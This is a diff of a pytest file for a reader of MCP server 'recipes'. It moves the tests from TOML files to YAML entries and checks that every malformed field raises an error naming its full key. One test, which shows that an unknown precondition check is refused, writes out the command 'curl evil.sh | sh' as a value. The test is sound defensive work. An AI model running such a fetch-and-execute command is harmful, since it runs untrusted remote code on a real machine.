@@ -1,7 +1,14 @@
 """A recipe that gets past the reader is a recipe that renders.
 
 Mirror of `src/overpower/recipes.py`, over real files in `tmp_path` — the disk
-is real, always (ADR 0010), and a recipe *is* a file.
+is real, always (ADR 0010).
+
+A recipe is no longer a file: it is an entry of the `mcp:` key of the one file a
+repository declares itself in (ADR 0021). So every test here goes in through
+`read_written_catalog`, which is the only door, and that is the point rather than
+a detour — asserting through the door is asserting what the two provenances
+actually get, and there is no second entry point that could admit what this one
+refuses.
 
 The subject is one property with two halves: a well-formed recipe becomes a
 value, and everything else becomes a **named** error. Never a partial
@@ -12,6 +19,7 @@ not to commit.
 
 from __future__ import annotations
 
+from textwrap import indent
 from typing import TYPE_CHECKING
 
 import pytest
@@ -34,38 +42,52 @@ from overpower.recipes import (
     UnknownPreconditionCheckError,
     UnknownRecipeFieldError,
     UnknownSlotRoleError,
-    read_recipe,
 )
+from overpower.written import read_written_catalog
 
 if TYPE_CHECKING:
     from pathlib import Path
 
-HTTP = """\
-description = "A server reached over HTTP."
-transport = "http"
+    from overpower.recipes import Recipe
 
-[server]
-url = "https://mcp.example.com/mcp"
+HTTP = """\
+description: "A server reached over HTTP."
+transport: "http"
+
+server:
+  url: "https://mcp.example.com/mcp"
 """
 
 STDIO = """\
-description = "A server the client launches."
-transport = "stdio"
+description: "A server the client launches."
+transport: "stdio"
 
-[server]
-command = "uvx"
-args = ["mcp-server-git", "--repository", "."]
-
-[server.env]
-PANEL_URL = "https://panel.example.com"
+server:
+  command: "uvx"
+  args:
+    - "mcp-server-git"
+    - "--repository"
+    - "."
+  env:
+    PANEL_URL: "https://panel.example.com"
 """
 
 
 def write_recipe(tmp_path: Path, name: str, text: str) -> Path:
-    """One recipe file, exactly as the catalog root carries it."""
-    path = tmp_path / f"{name}.toml"
-    path.write_text(text, encoding="utf-8", newline="\n")
+    """One recipe, as an entry of the one written file a repository declares itself in.
+
+    `text` is the body at column zero and is indented in here, so a test still
+    composes a recipe by concatenating fragments — `f"{HTTP}\\n{slots}"` — the
+    way it did when a recipe was a file of its own.
+    """
+    path = tmp_path / ".overpower.yaml"
+    path.write_text(f"mcp:\n  {name}:\n{indent(text, '    ')}", encoding="utf-8", newline="\n")
     return path
+
+
+def read_recipe(path: Path) -> Recipe:
+    """The one recipe the file at `path` declares, through the one reader."""
+    return read_written_catalog(path).mcps[0]
 
 
 def test_an_http_recipe_becomes_a_value_carrying_its_url(tmp_path: Path) -> None:
@@ -77,7 +99,7 @@ def test_an_http_recipe_becomes_a_value_carrying_its_url(tmp_path: Path) -> None
 
 
 def test_a_stdio_recipe_carries_its_command_its_args_and_its_environment(tmp_path: Path) -> None:
-    """`[server.env]` is configuration and not a secret: it is written literally.
+    """`server.env` is configuration and not a secret: it is written literally.
 
     The distinction came from a real server — the address of a panel is not a
     secret, and a schema that could only hold slots would refuse to write it,
@@ -93,11 +115,31 @@ def test_a_stdio_recipe_carries_its_command_its_args_and_its_environment(tmp_pat
     )
 
 
-def test_the_slug_comes_from_the_file_name_and_never_from_a_field(tmp_path: Path) -> None:
-    """Rule 8: the tree is the catalog, so the name is where the file is."""
+def test_the_slug_comes_from_the_key_and_never_from_a_field(tmp_path: Path) -> None:
+    """Rule 8 said in the one place a recipe has: a recipe never lands, so it has no tree.
+
+    The slug is where the declaration sits — the key under `mcp:` — and not
+    something the entry declares a second time about itself.
+    """
     recipe = read_recipe(write_recipe(tmp_path, "hostinger-vps", HTTP))
 
     assert recipe.name == "hostinger-vps"
+
+
+def test_a_message_about_a_recipe_names_which_recipe(tmp_path: Path) -> None:
+    """One file now holds several, so `transport` alone would cost a bisection.
+
+    Asserted on `MalformedRecipeError` here and on `ForbiddenTransportError`
+    below, which is the pair that covers both halves of the module's error
+    model — the malformed and the refused.
+    """
+    path = write_recipe(tmp_path, "broken", 'description: "x"\ntransport: 1\n')
+
+    with pytest.raises(MalformedRecipeError) as refused:
+        read_recipe(path)
+
+    assert refused.value.key == "mcp.broken.transport"
+    assert str(path) in str(refused.value)
 
 
 @pytest.mark.parametrize(
@@ -120,21 +162,22 @@ def test_a_transport_outside_the_closed_set_is_refused_naming_it(
     `ws` exists in one target only.
     """
     path = write_recipe(
-        tmp_path, "odd", HTTP.replace('transport = "http"', f'transport = "{transport}"')
+        tmp_path, "odd", HTTP.replace('transport: "http"', f'transport: "{transport}"')
     )
 
     with pytest.raises(ForbiddenTransportError) as refused:
         read_recipe(path)
 
     assert refused.value.transport == transport
+    assert refused.value.key == "mcp.odd.transport"
     assert "stdio, http" in str(refused.value).replace("http, stdio", "stdio, http")
 
 
 @pytest.mark.parametrize(
     "field",
     [
-        pytest.param('transports = "http"\n', id="typo"),
-        pytest.param('targets = ["claude-code"]\n', id="targets"),
+        pytest.param('transports: "http"\n', id="typo"),
+        pytest.param('targets: ["claude-code"]\n', id="targets"),
     ],
 )
 def test_a_field_this_version_cannot_render_is_refused_by_name(tmp_path: Path, field: str) -> None:
@@ -160,13 +203,13 @@ def test_a_field_the_declared_transport_has_no_reader_for_is_refused(tmp_path: P
     path = write_recipe(
         tmp_path,
         "mixed",
-        'description = "x"\ntransport = "stdio"\n\n[server]\ncommand = "uvx"\nurl = "https://x/mcp"\n',
+        'description: "x"\ntransport: "stdio"\n\nserver:\n  command: "uvx"\n  url: "https://x/mcp"\n',
     )
 
     with pytest.raises(UnknownRecipeFieldError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "server.url"
+    assert refused.value.key == "mcp.mixed.server.url"
 
 
 def test_the_source_token_with_no_source_to_resolve_it_is_refused_by_name(tmp_path: Path) -> None:
@@ -174,30 +217,34 @@ def test_the_source_token_with_no_source_to_resolve_it_is_refused_by_name(tmp_pa
     path = write_recipe(
         tmp_path,
         "homegrown",
-        'description = "x"\ntransport = "stdio"\n\n[server]\ncommand = "uv"\n'
-        'args = ["run", "--project", "{source}", "server.py"]\n',
+        'description: "x"\ntransport: "stdio"\n\nserver:\n  command: "uv"\n'
+        '  args: ["run", "--project", "{source}", "server.py"]\n',
     )
 
     with pytest.raises(SourcelessSubstitutionError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "server.args"
+    assert refused.value.key == "mcp.homegrown.server.args"
 
 
 # --------------------------------------------------------------------------- #
-# [source]: code the recipe brings, cloned to the machine
+# source: code the recipe brings, cloned to the machine
 # --------------------------------------------------------------------------- #
 
 SOURCED = """\
-description = "A server built from its own repository."
-transport = "stdio"
+description: "A server built from its own repository."
+transport: "stdio"
 
-[source]
-url = "https://github.com/example/homegrown-mcp"
+source:
+  url: "https://github.com/example/homegrown-mcp"
 
-[server]
-command = "uv"
-args = ["run", "--project", "{source}", "server.py"]
+server:
+  command: "uv"
+  args:
+    - "run"
+    - "--project"
+    - "{source}"
+    - "server.py"
 """
 
 
@@ -230,13 +277,19 @@ def test_the_source_token_with_a_source_to_resolve_it_is_admitted(tmp_path: Path
 @pytest.mark.parametrize(
     ("source", "key"),
     [
-        pytest.param("", "source.url", id="no-url"),
-        pytest.param('url = ""\n', "source.url", id="empty-url"),
-        pytest.param('url = "x"\nsubdir = "."\n', "source.subdir", id="unknown-field"),
+        pytest.param("", "mcp.homegrown.source", id="nothing-under-it"),
+        pytest.param('  url: ""\n', "mcp.homegrown.source.url", id="empty-url"),
+        pytest.param('  subdir: "."\n', "mcp.homegrown.source.subdir", id="unknown-field"),
     ],
 )
 def test_a_malformed_source_names_the_field(tmp_path: Path, source: str, key: str) -> None:
-    path = write_recipe(tmp_path, "homegrown", f"{HTTP}\n[source]\n{source}")
+    """`source:` with nothing under it is the row the format made sayable.
+
+    YAML answers `None` where TOML could only spell an empty table, so a
+    declaration somebody started and did not finish is now visible — and it is
+    refused naming the key, rather than read as *this recipe has no source*.
+    """
+    path = write_recipe(tmp_path, "homegrown", f"{HTTP}\nsource:\n{source}")
 
     with pytest.raises((MalformedRecipeError, UnknownRecipeFieldError)) as refused:
         read_recipe(path)
@@ -248,33 +301,37 @@ def test_a_source_that_is_not_a_table_is_refused_naming_the_field(tmp_path: Path
     path = write_recipe(
         tmp_path,
         "homegrown",
-        f'source = "https://github.com/x/y"\n{HTTP}',
+        f'source: "https://github.com/x/y"\n{HTTP}',
     )
 
     with pytest.raises(MalformedRecipeError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "source"
+    assert refused.value.key == "mcp.homegrown.source"
 
 
 @pytest.mark.parametrize(
     ("text", "key"),
     [
         pytest.param(
-            'transport = "http"\n\n[server]\nurl = "https://x/mcp"\n',
-            "description",
+            'transport: "http"\n\nserver:\n  url: "https://x/mcp"\n',
+            "mcp.broken.description",
             id="no-description",
         ),
         pytest.param(
-            'description = "x"\n\n[server]\nurl = "https://x/mcp"\n', "transport", id="no-transport"
+            'description: "x"\n\nserver:\n  url: "https://x/mcp"\n',
+            "mcp.broken.transport",
+            id="no-transport",
         ),
-        pytest.param('description = "x"\ntransport = "http"\n', "server", id="no-server"),
+        pytest.param('description: "x"\ntransport: "http"\n', "mcp.broken.server", id="no-server"),
         pytest.param(
-            'description = "x"\ntransport = "http"\n\n[server]\n', "server.url", id="no-url"
+            'description: "x"\ntransport: "http"\n\nserver:\n  url:\n',
+            "mcp.broken.server.url",
+            id="url-with-nothing-under-it",
         ),
         pytest.param(
-            'description = ""\ntransport = "http"\n\n[server]\nurl = "https://x/mcp"\n',
-            "description",
+            'description: ""\ntransport: "http"\n\nserver:\n  url: "https://x/mcp"\n',
+            "mcp.broken.description",
             id="empty-description",
         ),
     ],
@@ -284,7 +341,7 @@ def test_a_malformed_recipe_names_the_file_and_the_field(
 ) -> None:
     path = write_recipe(tmp_path, "broken", text)
 
-    with pytest.raises(MalformedRecipeError) as refused:
+    with pytest.raises((MalformedRecipeError, UnknownRecipeFieldError)) as refused:
         read_recipe(path)
 
     assert refused.value.key == key
@@ -296,19 +353,20 @@ def test_a_malformed_recipe_names_the_file_and_the_field(
 # --------------------------------------------------------------------------- #
 
 SLOTTED = """\
-description = "A server the client launches, with a secret and an address."
-transport = "stdio"
+description: "A server the client launches, with a secret and an address."
+transport: "stdio"
 
-[server]
-command = "npx"
-args = ["-y", "@masonator/coolify-mcp@2.12.0"]
+server:
+  command: "npx"
+  args:
+    - "-y"
+    - "@masonator/coolify-mcp@2.12.0"
+  env:
+    COOLIFY_BASE_URL: "https://vps.panlabs.tech"
 
-[server.env]
-COOLIFY_BASE_URL = "https://vps.panlabs.tech"
-
-[[slots]]
-name = "COOLIFY_ACCESS_TOKEN"
-role = "env"
+slots:
+  - name: "COOLIFY_ACCESS_TOKEN"
+    role: "env"
 """
 """The real shape of the case that made the distinction necessary.
 
@@ -319,16 +377,22 @@ talk.
 """
 
 BEARER = """\
-description = "A server reached over HTTP, behind a personal access token."
-transport = "http"
+description: "A server reached over HTTP, behind a personal access token."
+transport: "http"
 
-[server]
-url = "https://api.githubcopilot.com/mcp"
+server:
+  url: "https://api.githubcopilot.com/mcp"
 
-[[slots]]
-name = "GITHUB_PAT_TOKEN"
-role = "bearer"
+slots:
+  - name: "GITHUB_PAT_TOKEN"
+    role: "bearer"
 """
+
+
+def slot(name: str, role: str, header: str = "") -> str:
+    """One entry of `slots:`, at column zero so it appends to any recipe body."""
+    written = f'slots:\n  - name: "{name}"\n    role: "{role}"\n'
+    return f'{written}    header: "{header}"\n' if header else written
 
 
 def test_a_slot_is_read_as_a_name_and_a_role_and_never_as_a_value(tmp_path: Path) -> None:
@@ -345,7 +409,7 @@ def test_a_slot_is_read_as_a_name_and_a_role_and_never_as_a_value(tmp_path: Path
 
 
 def test_a_literal_and_a_slot_are_two_different_declarations(tmp_path: Path) -> None:
-    """Slot is what the overpower refuses to write; `[server.env]` is what it writes."""
+    """Slot is what the overpower refuses to write; `server.env` is what it writes."""
     recipe = read_recipe(write_recipe(tmp_path, "coolify", SLOTTED))
 
     assert recipe.server == StdioServer(
@@ -374,9 +438,7 @@ def test_a_header_slot_names_the_header_it_fills(tmp_path: Path) -> None:
     """An arbitrary header needs two names, and only one of them is the variable."""
     recipe = read_recipe(
         write_recipe(
-            tmp_path,
-            "paneled",
-            f'{HTTP}\n[[slots]]\nname = "PANEL_TOKEN"\nrole = "header"\nheader = "X-Panel-Token"\n',
+            tmp_path, "paneled", f"{HTTP}\n{slot('PANEL_TOKEN', 'header', 'X-Panel-Token')}"
         )
     )
 
@@ -393,7 +455,7 @@ def test_a_header_slot_names_the_header_it_fills(tmp_path: Path) -> None:
 )
 def test_a_role_outside_the_closed_set_is_refused_naming_it(tmp_path: Path, role: str) -> None:
     """A role nobody renders would install a server with the secret missing, at exit 0."""
-    path = write_recipe(tmp_path, "odd", f'{HTTP}\n[[slots]]\nname = "TOKEN"\nrole = "{role}"\n')
+    path = write_recipe(tmp_path, "odd", f"{HTTP}\n{slot('TOKEN', role)}")
 
     with pytest.raises(UnknownSlotRoleError) as refused:
         read_recipe(path)
@@ -403,15 +465,15 @@ def test_a_role_outside_the_closed_set_is_refused_naming_it(tmp_path: Path, role
 
 
 @pytest.mark.parametrize(
-    ("recipe", "role", "extra"),
+    ("recipe", "role", "header"),
     [
         pytest.param(HTTP, "env", "", id="env-over-http"),
         pytest.param(STDIO, "bearer", "", id="bearer-over-stdio"),
-        pytest.param(STDIO, "header", 'header = "X-Panel-Token"\n', id="header-over-stdio"),
+        pytest.param(STDIO, "header", "X-Panel-Token", id="header-over-stdio"),
     ],
 )
 def test_a_role_the_transport_cannot_carry_is_refused_naming_both(
-    tmp_path: Path, recipe: str, role: str, extra: str
+    tmp_path: Path, recipe: str, role: str, header: str
 ) -> None:
     """The pairing is a fact of the transport and not of any one target.
 
@@ -420,9 +482,7 @@ def test_a_role_the_transport_cannot_carry_is_refused_naming_both(
     Refused here, because a recipe that gets past this module is a recipe that
     renders — and the alternative is a renderer that drops the secret in silence.
     """
-    path = write_recipe(
-        tmp_path, "mixed", f'{recipe}\n[[slots]]\nname = "TOKEN"\nrole = "{role}"\n{extra}'
-    )
+    path = write_recipe(tmp_path, "mixed", f"{recipe}\n{slot('TOKEN', role, header)}")
 
     with pytest.raises(MismatchedSlotRoleError) as refused:
         read_recipe(path)
@@ -432,25 +492,33 @@ def test_a_role_the_transport_cannot_carry_is_refused_naming_both(
 
 
 @pytest.mark.parametrize(
-    ("slot", "key"),
+    ("entry", "key"),
     [
         pytest.param(
-            'name = "TOKEN"\nrole = "header"\n', "slots[0].header", id="header-role-with-no-header"
+            '  - name: "TOKEN"\n    role: "header"\n',
+            "mcp.broken.slots[0].header",
+            id="header-role-with-no-header",
         ),
         pytest.param(
-            'name = "TOKEN"\nrole = "bearer"\nheader = "X-Panel-Token"\n',
-            "slots[0].header",
+            '  - name: "TOKEN"\n    role: "bearer"\n    header: "X-Panel-Token"\n',
+            "mcp.broken.slots[0].header",
             id="header-on-a-role-that-names-none",
         ),
-        pytest.param('role = "bearer"\n', "slots[0].name", id="no-name"),
-        pytest.param('name = ""\nrole = "bearer"\n', "slots[0].name", id="empty-name"),
-        pytest.param('name = "TOKEN"\n', "slots[0].role", id="no-role"),
-        pytest.param('name = "TOKEN"\nrole = ""\n', "slots[0].role", id="empty-role"),
+        pytest.param('  - role: "bearer"\n', "mcp.broken.slots[0].name", id="no-name"),
+        pytest.param(
+            '  - name: ""\n    role: "bearer"\n', "mcp.broken.slots[0].name", id="empty-name"
+        ),
+        pytest.param('  - name: "TOKEN"\n', "mcp.broken.slots[0].role", id="no-role"),
+        pytest.param(
+            '  - name: "TOKEN"\n    role: ""\n', "mcp.broken.slots[0].role", id="empty-role"
+        ),
     ],
 )
-def test_a_malformed_slot_names_the_slot_and_the_field(tmp_path: Path, slot: str, key: str) -> None:
+def test_a_malformed_slot_names_the_slot_and_the_field(
+    tmp_path: Path, entry: str, key: str
+) -> None:
     """`slots[0]` and not `slots`: a recipe may declare several, and only one is wrong."""
-    path = write_recipe(tmp_path, "broken", f"{HTTP}\n[[slots]]\n{slot}")
+    path = write_recipe(tmp_path, "broken", f"{HTTP}\nslots:\n{entry}")
 
     with pytest.raises(MalformedRecipeError) as refused:
         read_recipe(path)
@@ -461,13 +529,15 @@ def test_a_malformed_slot_names_the_slot_and_the_field(tmp_path: Path, slot: str
 def test_an_unknown_field_inside_a_slot_is_refused_by_name(tmp_path: Path) -> None:
     """A slot is name, role and — for one role — the header it fills. Nothing else."""
     path = write_recipe(
-        tmp_path, "ahead", f'{HTTP}\n[[slots]]\nname = "TOKEN"\nrole = "bearer"\ndefault = "none"\n'
+        tmp_path,
+        "ahead",
+        f'{HTTP}\nslots:\n  - name: "TOKEN"\n    role: "bearer"\n    default: "none"\n',
     )
 
     with pytest.raises(UnknownRecipeFieldError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "slots[0].default"
+    assert refused.value.key == "mcp.ahead.slots[0].default"
 
 
 def test_a_slot_that_is_not_a_table_is_refused_naming_the_field(tmp_path: Path) -> None:
@@ -475,34 +545,34 @@ def test_a_slot_that_is_not_a_table_is_refused_naming_the_field(tmp_path: Path) 
     path = write_recipe(
         tmp_path,
         "broken",
-        'description = "x"\ntransport = "http"\nslots = ["GITHUB_PAT_TOKEN"]\n\n'
-        '[server]\nurl = "https://mcp.example.com/mcp"\n',
+        'description: "x"\ntransport: "http"\nslots: ["GITHUB_PAT_TOKEN"]\n\n'
+        'server:\n  url: "https://mcp.example.com/mcp"\n',
     )
 
     with pytest.raises(MalformedRecipeError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "slots[0]"
+    assert refused.value.key == "mcp.broken.slots[0]"
 
 
 @pytest.mark.parametrize(
     ("slots", "place"),
     [
         pytest.param(
-            '[[slots]]\nname = "TOKEN_A"\nrole = "bearer"\n\n'
-            '[[slots]]\nname = "TOKEN_B"\nrole = "bearer"\n',
+            'slots:\n  - name: "TOKEN_A"\n    role: "bearer"\n'
+            '  - name: "TOKEN_B"\n    role: "bearer"\n',
             "authorization",
             id="two-bearers-one-header",
         ),
         pytest.param(
-            '[[slots]]\nname = "TOKEN_A"\nrole = "bearer"\n\n'
-            '[[slots]]\nname = "TOKEN_B"\nrole = "header"\nheader = "authorization"\n',
+            'slots:\n  - name: "TOKEN_A"\n    role: "bearer"\n'
+            '  - name: "TOKEN_B"\n    role: "header"\n    header: "authorization"\n',
             "authorization",
             id="a-header-spelling-the-one-bearer-fills",
         ),
         pytest.param(
-            '[[slots]]\nname = "TOKEN_A"\nrole = "header"\nheader = "X-Panel-Token"\n\n'
-            '[[slots]]\nname = "TOKEN_B"\nrole = "header"\nheader = "x-panel-token"\n',
+            'slots:\n  - name: "TOKEN_A"\n    role: "header"\n    header: "X-Panel-Token"\n'
+            '  - name: "TOKEN_B"\n    role: "header"\n    header: "x-panel-token"\n',
             "x-panel-token",
             id="one-header-in-two-cases",
         ),
@@ -523,7 +593,7 @@ def test_two_slots_that_fill_one_place_are_refused_naming_the_place(
     with pytest.raises(CollidingSlotError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "slots[1]"
+    assert refused.value.key == "mcp.colliding.slots[1]"
     assert refused.value.place == place
 
 
@@ -531,14 +601,14 @@ def test_two_slots_that_fill_one_place_are_refused_naming_the_place(
     ("slots", "place"),
     [
         pytest.param(
-            '[[slots]]\nname = "API_KEY"\nrole = "header"\nheader = "X-One"\n\n'
-            '[[slots]]\nname = "API-KEY"\nrole = "header"\nheader = "X-Two"\n',
+            'slots:\n  - name: "API_KEY"\n    role: "header"\n    header: "X-One"\n'
+            '  - name: "API-KEY"\n    role: "header"\n    header: "X-Two"\n',
             "api-key",
             id="underscore-against-dash",
         ),
         pytest.param(
-            '[[slots]]\nname = "API_KEY"\nrole = "header"\nheader = "X-One"\n\n'
-            '[[slots]]\nname = "api_key"\nrole = "header"\nheader = "X-Two"\n',
+            'slots:\n  - name: "API_KEY"\n    role: "header"\n    header: "X-One"\n'
+            '  - name: "api_key"\n    role: "header"\n    header: "X-Two"\n',
             "api-key",
             id="two-cases-of-one-name",
         ),
@@ -572,7 +642,7 @@ def test_two_slots_whose_names_reach_one_prompt_are_refused_naming_the_prompt(
     with pytest.raises(CollidingSlotError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "slots[1]"
+    assert refused.value.key == "mcp.colliding.slots[1]"
     assert refused.value.place == place
 
 
@@ -584,8 +654,8 @@ def test_two_slots_whose_names_reach_two_prompts_are_both_kept(tmp_path: Path) -
     from, and refusing it would be a rule with no defect behind it.
     """
     slots = (
-        '[[slots]]\nname = "API_KEY"\nrole = "header"\nheader = "X-One"\n\n'
-        '[[slots]]\nname = "API_SECRET"\nrole = "header"\nheader = "X-Two"\n'
+        'slots:\n  - name: "API_KEY"\n    role: "header"\n    header: "X-One"\n'
+        '  - name: "API_SECRET"\n    role: "header"\n    header: "X-Two"\n'
     )
     path = write_recipe(tmp_path, "distinct", f"{HTTP}\n{slots}")
 
@@ -605,8 +675,8 @@ def test_one_variable_may_fill_two_different_places(tmp_path: Path) -> None:
         write_recipe(
             tmp_path,
             "twice",
-            f'{HTTP}\n[[slots]]\nname = "TOKEN"\nrole = "bearer"\n\n'
-            '[[slots]]\nname = "TOKEN"\nrole = "header"\nheader = "X-Panel-Token"\n',
+            f'{HTTP}\nslots:\n  - name: "TOKEN"\n    role: "bearer"\n'
+            '  - name: "TOKEN"\n    role: "header"\n    header: "X-Panel-Token"\n',
         )
     )
 
@@ -619,7 +689,7 @@ def test_one_variable_may_fill_two_different_places(tmp_path: Path) -> None:
 def test_a_name_declared_both_as_a_secret_and_as_a_literal_is_refused(tmp_path: Path) -> None:
     """The two declarations contradict each other, and the file cannot say both.
 
-    `[server.env]` means *write this value*; a slot means *never write it*. A
+    `server.env` means *write this value*; a slot means *never write it*. A
     reader that let both through would resolve the contradiction by overwriting
     one of them, and whichever lost would lose in silence — either the address
     never lands, or the secret does.
@@ -627,14 +697,15 @@ def test_a_name_declared_both_as_a_secret_and_as_a_literal_is_refused(tmp_path: 
     path = write_recipe(
         tmp_path,
         "contradictory",
-        'description = "x"\ntransport = "stdio"\n\n[server]\ncommand = "npx"\n\n'
-        '[server.env]\nPANEL_TOKEN = "written"\n\n[[slots]]\nname = "PANEL_TOKEN"\nrole = "env"\n',
+        'description: "x"\ntransport: "stdio"\n\nserver:\n  command: "npx"\n'
+        '  env:\n    PANEL_TOKEN: "written"\n\n'
+        'slots:\n  - name: "PANEL_TOKEN"\n    role: "env"\n',
     )
 
     with pytest.raises(CollidingSlotError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "slots[0]"
+    assert refused.value.key == "mcp.contradictory.slots[0]"
     assert "server.env" in str(refused.value)
 
 
@@ -645,18 +716,48 @@ def test_a_recipe_with_no_slots_at_all_carries_none(tmp_path: Path) -> None:
     assert recipe.slots == ()
 
 
-def test_a_file_that_is_not_toml_names_the_recipe_that_would_not_parse(tmp_path: Path) -> None:
-    """`tomllib` reports a line and a column and never the file.
+def test_flow_style_reads_as_the_same_recipe_block_style_does(tmp_path: Path) -> None:
+    """The single-way-to-write is gone, and it deliberately gains no mechanism (ADR 0021).
 
-    Which recipe would not parse is the first thing whoever reads that message
-    needs, and the more so once the file is somebody else's.
+    `slots: [{name: X, role: env}]` and the same thing in block style are one
+    document to any parser, and this reader works on the parsed tree. Block style
+    is the convention of the house — rule 43 of the panlabs standard, where a
+    rule with no mechanism is checked in review — and here there is not even a
+    review, because the file belongs to whoever publishes it.
+
+    Refusing flow style would cost a **second parser**: `yaml.safe_load` answers
+    a tree and not positions, so telling the two apart means re-reading the bytes
+    to buy cosmetic uniformity in somebody else's repository.
     """
-    path = write_recipe(tmp_path, "notatoml", "this is not = = toml\n")
+    flowed = (
+        '{description: "A server reached over HTTP", transport: http, '
+        'server: {url: "https://mcp.example.com/mcp"}, '
+        "slots: [{name: TOKEN, role: bearer}]}"
+    )
+    blocked = f"{HTTP}\n{slot('TOKEN', 'bearer')}"
+
+    flow = read_recipe(write_recipe(tmp_path, "cloudflare", flowed))
+    block = read_recipe(write_recipe(tmp_path, "cloudflare", blocked))
+
+    assert flow.server == block.server
+    assert flow.slots == block.slots == (BearerSlot(name="TOKEN"),)
+
+
+def test_a_key_that_is_not_a_name_is_refused_the_way_the_written_file_refuses_one(
+    tmp_path: Path,
+) -> None:
+    """TOML had no key type but string; YAML has, so the key is checked here too.
+
+    `1:` decodes to the integer `1`, and the cast this reader used to do would
+    now be a lie living in the module whose only reason to exist is being the
+    type tripwire.
+    """
+    path = write_recipe(tmp_path, "odd", f'{HTTP}\nslots:\n  - 1: "x"\n    role: "bearer"\n')
 
     with pytest.raises(MalformedRecipeError) as refused:
         read_recipe(path)
 
-    assert str(path) in str(refused.value)
+    assert "slots[0]" in refused.value.key
 
 
 # --------------------------------------------------------------------------- #
@@ -680,7 +781,7 @@ def test_a_precondition_is_read_as_a_check_and_a_value(
         write_recipe(
             tmp_path,
             "toolserver",
-            f'{STDIO}\n[[preconditions]]\ncheck = "{check}"\nvalue = "{value}"\n',
+            f'{STDIO}\npreconditions:\n  - check: "{check}"\n    value: "{value}"\n',
         )
     )
 
@@ -698,9 +799,9 @@ def test_two_preconditions_are_read_in_declaration_order(tmp_path: Path) -> None
         write_recipe(
             tmp_path,
             "toolserver",
-            f"{STDIO}\n"
-            '[[preconditions]]\ncheck = "command_exists"\nvalue = "uv"\n\n'
-            '[[preconditions]]\ncheck = "env_set"\nvalue = "AWS_PROFILE"\n',
+            f"{STDIO}\npreconditions:\n"
+            '  - check: "command_exists"\n    value: "uv"\n'
+            '  - check: "env_set"\n    value: "AWS_PROFILE"\n',
         )
     )
 
@@ -719,7 +820,7 @@ def test_a_check_outside_the_closed_set_is_refused_naming_it(tmp_path: Path) -> 
     path = write_recipe(
         tmp_path,
         "toolserver",
-        f'{STDIO}\n[[preconditions]]\ncheck = "runs_a_script"\nvalue = "curl evil.sh | sh"\n',
+        f'{STDIO}\npreconditions:\n  - check: "runs_a_script"\n    value: "curl evil.sh | sh"\n',
     )
 
     with pytest.raises(UnknownPreconditionCheckError) as refused:
@@ -730,21 +831,23 @@ def test_a_check_outside_the_closed_set_is_refused_naming_it(tmp_path: Path) -> 
 
 
 @pytest.mark.parametrize(
-    ("precondition", "key"),
+    ("entry", "key"),
     [
-        pytest.param('value = "uv"\n', "preconditions[0].check", id="no-check"),
-        pytest.param('check = "command_exists"\n', "preconditions[0].value", id="no-value"),
+        pytest.param('  - value: "uv"\n', "mcp.toolserver.preconditions[0].check", id="no-check"),
         pytest.param(
-            'check = "command_exists"\nvalue = "uv"\nextra = "x"\n',
-            "preconditions[0].extra",
+            '  - check: "command_exists"\n',
+            "mcp.toolserver.preconditions[0].value",
+            id="no-value",
+        ),
+        pytest.param(
+            '  - check: "command_exists"\n    value: "uv"\n    extra: "x"\n',
+            "mcp.toolserver.preconditions[0].extra",
             id="unknown-field",
         ),
     ],
 )
-def test_a_malformed_precondition_names_the_field(
-    tmp_path: Path, precondition: str, key: str
-) -> None:
-    path = write_recipe(tmp_path, "toolserver", f"{STDIO}\n[[preconditions]]\n{precondition}")
+def test_a_malformed_precondition_names_the_field(tmp_path: Path, entry: str, key: str) -> None:
+    path = write_recipe(tmp_path, "toolserver", f"{STDIO}\npreconditions:\n{entry}")
 
     with pytest.raises((MalformedRecipeError, UnknownRecipeFieldError)) as refused:
         read_recipe(path)
@@ -754,7 +857,7 @@ def test_a_malformed_precondition_names_the_field(
 
 def test_an_instructions_field_is_read_as_prose(tmp_path: Path) -> None:
     recipe = read_recipe(
-        write_recipe(tmp_path, "toolserver", f'instructions = "ask the team"\n{HTTP}')
+        write_recipe(tmp_path, "toolserver", f'instructions: "ask the team"\n{HTTP}')
     )
 
     assert recipe.instructions == "ask the team"
@@ -769,9 +872,9 @@ def test_a_recipe_with_no_instructions_carries_none(tmp_path: Path) -> None:
 def test_empty_instructions_are_refused_the_same_way_an_empty_description_is(
     tmp_path: Path,
 ) -> None:
-    path = write_recipe(tmp_path, "toolserver", f'instructions = ""\n{HTTP}')
+    path = write_recipe(tmp_path, "toolserver", f'instructions: ""\n{HTTP}')
 
     with pytest.raises(MalformedRecipeError) as refused:
         read_recipe(path)
 
-    assert refused.value.key == "instructions"
+    assert refused.value.key == "mcp.toolserver.instructions"
